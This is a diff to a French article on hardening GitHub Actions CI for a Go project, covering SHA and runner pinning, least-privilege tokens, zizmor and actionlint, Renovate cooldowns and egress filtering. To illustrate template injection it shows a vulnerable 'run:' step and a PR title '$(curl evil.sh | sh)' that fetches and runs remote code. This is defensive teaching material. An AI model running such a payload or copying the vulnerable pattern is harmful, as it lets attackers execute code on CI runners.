@@ -32,7 +32,7 @@ Six workflows, un rôle par fichier. Le release (GoReleaser) est traité à part
 
 ## Le socle de durcissement
 
-C'est ce qui distingue une CI correcte d'une CI qu'on peut laisser tourner sur un repo public sans y penser. Quatre patterns, appliqués sur **tous** les workflows.
+C'est ce qui distingue une CI correcte d'une CI qu'on peut laisser tourner sur un repo public sans y penser. 5 patterns, appliqués sur **tous** les workflows.
 
 ### Épingler les actions par SHA, pas par tag
 
@@ -43,7 +43,7 @@ Un tag Git est mutable. `uses: actions/checkout@v7` pointe vers ce que le mainte
 - uses: actions/checkout@v7
 
 # Durci : le SHA est immuable, le commentaire garde la version lisible
-- uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 ```
 
 Le commentaire `# v7.0.0` n'est pas décoratif : [Renovate](https://docs.renovatebot.com/) le lit pour bumper le SHA **et** mettre à jour le commentaire, ce qui garde le pinning sans figer les actions dans le passé. Sur `gopen`, les updates d'actions sont même groupées et automergées :
@@ -56,6 +56,17 @@ Le commentaire `# v7.0.0` n'est pas décoratif : [Renovate](https://docs.renovat
   "automergeType": "pr"
 }
 ```
+
+Ce qui se rate, c'est le pinning initial : on ajoute une action en `@v4` dans une PR et personne ne voit passer le tag. Le preset `helpers:pinGitHubActionDigests` et `pinDigests: true` demandent à Renovate de convertir en SHA tout ce qui traîne en tag, y compris les images de conteneurs référencées dans un step.
+
+```json title="renovate.json"
+{
+  "extends": ["config:recommended", "helpers:pinGitHubActionDigests"],
+  "pinDigests": true
+}
+```
+
+Le pinning a par contre une limite qu'il vaut mieux connaître : il ne couvre que le premier niveau. Si `actions/checkout` référence lui-même une autre action par tag dans son `action.yml`, la résolution se fait au runtime et le SHA qu'on a écrit n'y change rien, donc quelqu'un qui compromet l'action imbriquée arrive quand même jusqu'au runner. GitHub a annoncé dans sa [roadmap sécurité Actions 2026](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) un bloc `dependencies:` dans le YAML du workflow, qui lockerait les dépendances directes **et** transitives par SHA avec vérification du hash avant exécution, dans l'esprit d'un `go.mod` + `go.sum`. En attendant, la seule vraie parade est de limiter le nombre d'actions tierces qu'on tire.
 
 ### Permissions au moindre privilège
 
@@ -84,10 +95,24 @@ L'échelle qu'on retrouve dans le repo :
 Par défaut, `actions/checkout` laisse le token traîner dans la config Git du runner. Un script de build compromis peut le récupérer et pousser sur le repo. On le désactive partout :
 
 ```yaml
-- uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
   with:
     persist-credentials: false
 ```
+
+### Épingler aussi le runner
+
+`ubuntu-latest` est un tag mutable de plus, simplement pas hébergé sur GitHub Marketplace. GitHub le fait glisser d'une image à la suivante avec quelques semaines de préavis, et le jour du basculement la CI change de version de bash, de Docker et de toolchains préinstallées sans qu'aucun commit ne le raconte.
+
+```yaml
+# Le contenu change sous nos pieds
+runs-on: ubuntu-latest
+
+# La version est explicite, son bump devient un commit
+runs-on: ubuntu-24.04
+```
+
+Renovate a un manager `github-runners` qui suit ces labels comme le reste, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit.
 
 ### zizmor : le linter de tes workflows
 
@@ -106,18 +131,34 @@ permissions: {}
 jobs:
   zizmor:
     name: Run zizmor
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     permissions:
       security-events: write
     steps:
-      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
-      - uses: zizmorcore/zizmor-action@192e21d79ab29983730a13d1382995c2307fbcaa # v0.5.7
+      - uses: zizmorcore/zizmor-action@3dc1ecc9bcb9e94e9b2c709687979e1298497054 # v0.6.2
 ```
 
 !!! tip "Faire tourner zizmor en local"
     `uvx zizmor .github/workflows/` (ou `pipx run zizmor`) donne le même verdict avant de committer.
+
+Le finding qui mérite un exemple, c'est *template injection*. `${{ }}` est une substitution textuelle faite **avant** que bash voie la ligne, donc tout ce qu'un contributeur contrôle (titre et corps de PR, nom de branche, message de commit) arrive dans le script sans guillemets :
+
+```yaml
+# Vulnérable : le titre de la PR est collé tel quel dans le script
+- run: echo "PR: ${{ github.event.pull_request.title }}"
+
+# Durci : bash reçoit une variable, quel que soit son contenu
+- env:
+    TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR: $TITLE"
+```
+
+Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas, et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.
+
+zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck, et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Les deux se recouvrent sur l'injection de template, ce qui n'est pas plus mal.
 
 ## Test et build multi-plateforme
 
@@ -126,9 +167,9 @@ Deux jobs dans `ci.yml`. Le premier teste, le second vérifie que le binaire com
 ```yaml title=".github/workflows/ci.yml"
 jobs:
   test:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
       - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
@@ -142,15 +183,15 @@ jobs:
     runs-on: ${{ matrix.os }}
     strategy:
       matrix:
-        os: [ubuntu-latest, macos-latest, windows-latest]
+        os: [ubuntu-24.04, macos-15, windows-2025]
     steps:
-      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
       - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
         with:
           go-version-file: go.mod
-      - run: go build -v -o gopen${{ matrix.os == 'windows-latest' && '.exe' || '' }} .
+      - run: go build -v -o gopen${{ matrix.os == 'windows-2025' && '.exe' || '' }} .
 ```
 
 Trois choix qui comptent :
@@ -267,7 +308,7 @@ permissions:
 
 jobs:
   govulncheck:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
       - uses: golang/govulncheck-action@032d45514ae346b1db93c04b0c90b841c370344f # v1.1.0
         with:
@@ -275,6 +316,22 @@ jobs:
 ```
 
 Il couvre aussi les vulnérabilités de la toolchain Go elle-même, pas seulement les libs tierces.
+
+## Durcir au-delà des workflows
+
+3 couches qui ne sont pas sur `gopen` aujourd'hui, chacune à un fichier de workflow près.
+
+- **[dependency-review-action](https://github.com/actions/dependency-review-action)** attaque le problème par l'autre bout que govulncheck : il compare le graphe de dépendances avant et après la PR, et bloque le merge si une CVE connue ou une licence non voulue **entre** dans l'arbre. govulncheck dit si on appelle vraiment la fonction vulnérable, dependency-review dit qu'elle arrive, ce qui est le bon moment pour discuter d'une dépendance qu'on n'a pas encore.
+
+    ```yaml
+    - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
+    ```
+
+- **[OpenSSF Scorecard](https://securityscorecards.dev/)** note le repo sur une vingtaine de checks et publie le résultat dans l'onglet Security. Son intérêt est de regarder ce qui n'est pas dans les workflows : protection de branche, présence d'une politique de sécurité, signature des releases, activité de maintenance. Un audit qui tourne tout seul plutôt qu'une relecture annuelle.
+
+- **[harden-runner](https://github.com/step-security/harden-runner)** filtre le trafic sortant du runner. On le pose d'abord en `audit` pour voir ce que la CI contacte réellement, puis en `block` avec une allow-list. C'est ce mécanisme qui a permis de repérer la compromission de `tj-actions/changed-files` en 2025 : les runners exfiltraient vers un endpoint qui n'avait rien à faire là, et l'anomalie est sortie dans les rapports d'egress avant que qui que ce soit lise le diff de l'action.
+
+GitHub prépare son propre pare-feu d'egress natif, décrit dans la roadmap 2026, qui tournerait hors de la VM du runner et resterait donc actif même si un attaquant y obtient root.
 
 ## Feedback direct dans la PR
 
@@ -287,15 +344,18 @@ permissions:
 
 jobs:
   goimports:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
       - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
         with:
           go-version-file: go.mod
-      - run: go install golang.org/x/tools/cmd/goimports@latest
+      - env:
+          # renovate: datasource=go depName=golang.org/x/tools
+          GOIMPORTS_VERSION: v0.48.0
+        run: go install "golang.org/x/tools/cmd/goimports@${GOIMPORTS_VERSION}"
       - run: goimports -w $(find . -name '*.go')
       - uses: reviewdog/action-suggester@2558ba17e65a9039e73764a73009fc05fef28a46 # v1.24.3
         with:
@@ -303,6 +363,8 @@ jobs:
 ```
 
 Le job reformate le code, puis reviewdog compare avec ce qui a été poussé et propose le diff en commentaire. Même mécanique pour le Markdown avec `reviewdog/action-markdownlint` et `reporter: github-pr-review`.
+
+Le `go install ... @latest` qu'on écrit par réflexe est le même problème qu'un tag d'action : la version installée change sans commit, et un compte upstream compromis livre directement dans le job. Le proxy Go vérifie bien le checksum, mais d'une version qu'on n'a pas choisie, d'où le pin en variable d'env que Renovate suit via le commentaire `# renovate:`.
 
 ## Automerge et releases pilotées par les commits
 
@@ -321,6 +383,19 @@ Plus haut, seules les mises à jour d'actions étaient automergées. On peut ét
 ```
 
 `automergeType: pr` ouvre quand même une PR et attend les checks : l'automerge ne court-circuite pas la CI, il retire juste le clic humain une fois qu'elle est verte.
+
+Reste un trou que la CI verte ne bouche pas : automerger une version publiée il y a 10 minutes, c'est exactement le scénario des compromissions npm de ces derniers mois, où le package vérolé passe les tests sans problème et reste en ligne quelques heures avant d'être yanké. `minimumReleaseAge` fait attendre Renovate :
+
+```json title="renovate.json"
+{
+  "matchUpdateTypes": ["major", "minor", "patch"],
+  "minimumReleaseAge": "5 days"
+}
+```
+
+5 jours, c'est ce qu'applique Cilium sur son propre repo, et ça couvre à peu près la fenêtre pendant laquelle une release compromise se fait repérer. Le prix apparent, c'est un retard de 5 jours sur les patchs de sécurité, sauf que Renovate neutralise le cooldown dans sa config `vulnerabilityAlerts` (`minimumReleaseAge: null` par défaut) : les updates qui répondent à une CVE connue passent toujours tout de suite.
+
+Le cran d'après, c'est de réserver l'automerge à une allow-list d'orgs de confiance (`actions/**`, `golang.org/x/**`, `k8s.io/**`) et de passer tout le reste en revue humaine. Sur un projet à 10 dépendances directes c'est disproportionné, mais ça devient l'arbitrage à faire dès que l'arbre grossit.
 
 ### Faire du commit le déclencheur de version
 
@@ -369,9 +444,9 @@ permissions:
 
 jobs:
   release:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04
     steps:
-      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           fetch-depth: 0
           persist-credentials: false
@@ -421,6 +496,9 @@ Pourquoi tout dans un seul job, plutôt qu'un workflow qui tague et un autre qui
 
 Résultat : Renovate merge un `minor` de dépendance, la CI passe, une version mineure sort et est publiée — sans qu'une main touche à un tag.
 
+!!! tip "Rendre les releases immuables"
+    Une fois la release publiée, GitHub sait interdire de redéplacer son tag et de remplacer ses assets (toggle *Immutable releases* dans les settings du repo). C'est une case à cocher, et elle ferme le scénario où un compte compromis republie un binaire sous un tag déjà installé partout.
+
 ## Récap
 
 Ce qui fait la différence entre une CI Go qui marche et une CI Go qu'on laisse tourner sans y penser :
@@ -428,12 +506,13 @@ Ce qui fait la différence entre une CI Go qui marche et une CI Go qu'on laisse 
 - Actions épinglées par SHA, versions gardées lisibles en commentaire
 - `permissions:` au moindre privilège, par workflow et par job
 - `persist-credentials: false` sur chaque checkout
-- zizmor pour que tout ça reste vrai dans le temps
-- `go test -race` et build sur les trois OS
+- Runners nommés (`ubuntu-24.04`) et outils installés en version épinglée, jamais de `latest`
+- zizmor pour que tout ça reste vrai dans le temps, actionlint pour le shell dans les `run:`
+- `go test -race` et build sur les 3 OS
 - golangci-lint épinglé, exclusions justifiées, `max-same-issues: 0` pour ne rien masquer
 - govulncheck pour les CVE réellement atteignables
 - reviewdog pour un feedback actionnable en PR
-- Renovate en automerge (minor/patch/digest) et releases déclenchées par le type de commit
+- Renovate en automerge (minor/patch/digest) derrière un cooldown de 5 jours, et releases déclenchées par le type de commit
 
 !!! tip "Et après le CI ?"
     Une fois le CI vert et un tag posé — à la main ou calculé par la CI (voir plus haut) — c'est [GoReleaser](goreleaser.md) qui prend le relais : binaires multi-arch, images OCI, signatures cosign, publication Homebrew.
